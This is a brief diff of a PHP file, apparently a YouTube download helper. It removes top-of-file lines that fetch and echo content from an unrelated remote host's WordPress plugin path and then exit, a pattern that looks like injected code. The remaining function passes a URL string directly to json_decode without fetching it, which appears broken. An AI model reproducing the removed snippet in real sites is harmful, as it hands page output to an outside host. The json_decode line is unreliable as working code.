@@ -1,13 +1,5 @@
 <?php
 
-
-$url = "https://crypto.linkpath.ltd/wp-content/plugins/wp-automatic/php_cron.php?id=31";
-echo file_get_contents($url);
-exit;
-
-
-
-
 function ul($pat){
 $home = "https://api.youtubemultidownloader.com/$pat";
 $x = json_decode(($home),1);
